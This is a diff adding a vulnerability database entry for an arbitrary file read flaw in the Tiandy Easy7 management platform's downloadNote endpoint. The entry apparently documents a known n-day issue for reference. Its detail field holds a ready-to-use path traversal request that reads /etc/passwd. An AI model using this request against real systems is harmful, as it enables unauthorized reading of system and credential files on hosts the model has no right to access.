@@ -1,0 +1,11 @@
+vendor = "天地伟业"
+name = "天地伟业 Easy7 综合管理平台 downloadNote 任意文件读取漏洞"
+type = "任意文件读取"
+path = "/Easy7/rest/file/downloadNote"
+version = ""
+detail = "GET /Easy7/rest/file/downloadNote?fileName=../../../../../../etc/passwd HTTP/1.1 Host: target"
+fix = "联系厂商获取补丁"
+date = 20260315
+label = "nday"
+cve = "TVD-2026-05372"
+verifier = "AdySec"
